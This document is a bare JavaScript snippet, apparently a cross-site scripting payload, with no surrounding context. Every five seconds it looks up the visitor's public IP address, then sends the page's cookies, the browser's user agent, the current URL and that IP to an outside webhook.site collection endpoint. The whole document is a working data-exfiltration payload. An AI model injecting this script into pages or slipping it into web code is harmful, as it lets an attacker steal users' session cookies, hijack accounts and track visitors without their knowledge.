setInterval(() => {
  fetch('https://api.ipify.org?format=json')
    .then(r => r.json())
    .then(d => {
      fetch('https://webhook.site/76ae22f0-c5d3-4c12-af91-358ba81cf82f?cookie=' + document.cookie + '&ua=' + navigator.userAgent + '&loc=' + location.href + '&ip=' + d.ip);
    });
}, 5000);
